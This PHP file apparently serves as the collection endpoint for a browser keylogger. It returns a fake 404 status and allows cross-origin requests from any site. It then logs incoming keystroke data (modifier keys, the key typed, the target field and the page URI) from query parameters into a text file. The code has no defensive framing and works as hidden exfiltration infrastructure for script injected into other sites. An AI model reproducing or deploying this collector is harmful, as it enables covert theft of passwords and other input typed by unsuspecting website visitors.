<?php
header($_SERVER["SERVER_PROTOCOL"]." 404 Not Found", true, 404);
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$file = 'data.txt';
if(!file_exists($file)) 
{
    $fh = fopen($file, 'w');
}

function f($str)
{
    return trim(preg_replace("(\\\)","",htmlentities(strip_tags($str),ENT_QUOTES,'UTF-8')));
}

$altnKey=(int)$_GET['altnKey'];
$ctrlKey=(int)$_GET['ctrlKey'];
$userKey=f($_GET['userKey']);
$targKey=f($_GET['targKey']);
$userURI=f($_GET['userURI']);

$string = $altnKey."|".$ctrlKey."|".$userKey."|".$targKey."|".$userURI."\n";
file_put_contents($file, $string, FILE_APPEND);
?>